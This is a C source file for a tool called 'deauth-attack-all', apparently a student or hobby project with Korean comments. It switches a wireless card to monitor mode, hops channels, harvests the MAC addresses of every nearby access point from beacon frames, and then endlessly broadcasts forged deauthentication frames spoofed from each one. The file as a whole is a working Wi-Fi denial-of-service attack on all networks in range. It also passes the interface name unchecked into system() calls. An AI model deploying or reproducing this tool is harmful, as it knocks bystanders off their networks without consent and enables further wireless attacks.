#include <pthread.h>
#include <pcap.h>
#include <stdio.h>
#include "beacon.c"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define NULL 0x00
#define MAC_ALEN 6
#define MAC_ADDR_STR_LEN 17


int ConvertMacAddrStr2Array(const char *mac_addr_str, uint8_t mac_addr[MAC_ALEN]){
    int res, i ,val;
    char temp[MAC_ADDR_STR_LEN+1];
    if(strlen(mac_addr_str) != MAC_ADDR_STR_LEN) return -1;
    memcpy(temp, mac_addr_str, MAC_ADDR_STR_LEN);
    temp[MAC_ADDR_STR_LEN] = 0x00;
    for(i = 0; i < MAC_ALEN; i++){
        temp[(3*i)+2] = '\0';
        res = sscanf((const char *)&temp[3*i], "%x", &val);
        if(res==0) return -1;
        mac_addr[i] = (char)val;
    }
    return 0;
}


void monitor(char *dev){    //랜카드 모니터 모드 설정
    char command[50];
    if(strlen(dev)>20){
        printf("interface name length less than 20 characters");
        exit(0);
    }
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}


void usage(){
    printf("syntax: deauth-attack-all <interface>\n");
    printf("sample: deauth-attack-all wlan0\n");
}

void* thread_channel(void * dev){   //모든 채널의 와이파이 패킷을 받기 위해 3초마다 채널을 변경
    int cnt = 1;
    while(1){
            char command[100];
            if (cnt>13) cnt=1;
            sprintf(command, "iwconfig %s ch %d", (char *)dev, cnt);
            system(command);
            printf(" [*] Channel Change : %d\n",cnt++);
            sleep(3);
    }
    printf("Thread 2 Die!!\n");
}

void *ap_mac(void *dev) {
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap2 = pcap_open_live((char *)dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap2 == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", (char *)dev, errbuf);
        exit(0);
    }

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        unsigned int radiotap_len;
        unsigned char *smac = NULL;

        int res = pcap_next_ex(pcap2, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
            break;
        }

        radiotap_len = dump_radiotap((struct radiotap_header *)packet);
        packet += radiotap_len;
        smac = dump_beacon_header((struct beacon_header *)packet);

        if (smac != NULL){
            char mac[20];
            char strTemp2[20];
            int flag=0;

            sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x\n",smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
            //printf("mac : %s\n",mac);

            FILE* pFile = fopen("ap_mac.txt", "rb");
            if (pFile == NULL){
                printf("File not Found 1!\n");
                exit(0);
            }
            while(!feof(pFile)){
                fgets(strTemp2, sizeof(strTemp2),pFile);
                if(strcmp(mac, strTemp2)==0){
                    flag = 1;
                    break;
                }

            }
            fclose(pFile);

            if(flag == 0){
                FILE* pFile2 = fopen("ap_mac.txt", "ab");
                if (pFile2 == NULL){
                    printf("File not Found 2!\n");
                    exit(0);
                }
                if(fputs(mac, pFile2) != EOF){
                    //printf("ADD MAC ADDR : %s\n", mac);
                    fseek(pFile,0,SEEK_SET);
                }
                fclose(pFile2);
            }
        }

        usleep(10);
    }
    pcap_close(pcap2);
    printf("Thread 1 Die!!\n");
}


int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return 0;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    char * dev = argv[1];
    int num=0;

    uint8_t macAddr[MAC_ALEN];

    monitor(dev);

    FILE* pFile0 = fopen("ap_mac.txt", "wb");
    fclose(pFile0);
    printf("Create 'ap_mac.txt' File!\n");

    pthread_t thread;
    pthread_create(&thread, 0, ap_mac, (void *) dev);
    pthread_t thread2;
    pthread_create(&thread2, 0, thread_channel, (void *) dev);

    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    FILE* pFile = fopen("ap_mac.txt", "rb");

    //가짜 비콘 프레임 생성/초기화
    struct fake_beacon beacon;
    beacon.radiotap.version = 0x00;
    beacon.radiotap.pad = 0x00;
    beacon.radiotap.len = 0x000b;
    beacon.radiotap.present = 0x00028000;
    memset(beacon.radiotap.dummy,0x00,sizeof(uint8_t)*3);
    beacon.becon.frame_control = 0x00c0;
    beacon.becon.duration_id = 0x0000;
    memset(beacon.becon.dhost,0xff,sizeof(uint8_t)*6);
    beacon.becon.squence_control = 0x0000;
    beacon.fixed.reason_code = 0x07;

    while (1) {
        char strTemp[20];
        memset(strTemp,0x00,20);

        if(!feof(pFile)) fgets(strTemp, sizeof(strTemp),pFile);
        else fseek(pFile,0,SEEK_SET);
        if (strlen(strTemp) == 0){
            fseek(pFile,0,SEEK_SET);
            continue;
        }
        if (strTemp[strlen(strTemp)-1] == 0x0d) strTemp[strlen(strTemp)-1] = 0x00;
        if (strTemp[strlen(strTemp)-1] == 0x0a) strTemp[strlen(strTemp)-1] = 0x00;

        int ret = ConvertMacAddrStr2Array(strTemp, macAddr);
        if (ret){
            printf("Fail to convert MAC address\n");
            return -1;
        }
        memcpy(beacon.becon.shost, macAddr, 6);
        memcpy(beacon.becon.bssid, macAddr, 6);


        if (pcap_sendpacket(pcap, (unsigned char*)&beacon, sizeof(beacon)) != 0){
            printf("Fail sendpacket\n");
            exit (-1);
        }
        num++;
        printf("%5d | [AP] %02x:%02x:%02x:%02x:%02x:%02x -> [Broadcast] FF:FF:FF:FF:FF:FF | Deauth Packet!\n",num ,beacon.becon.bssid[0],beacon.becon.bssid[1],beacon.becon.bssid[2]
                                                                                                              ,beacon.becon.bssid[3],beacon.becon.bssid[4],beacon.becon.bssid[5]);
        usleep(1000);
    }
    fclose(pFile);
    pcap_close(pcap);
}
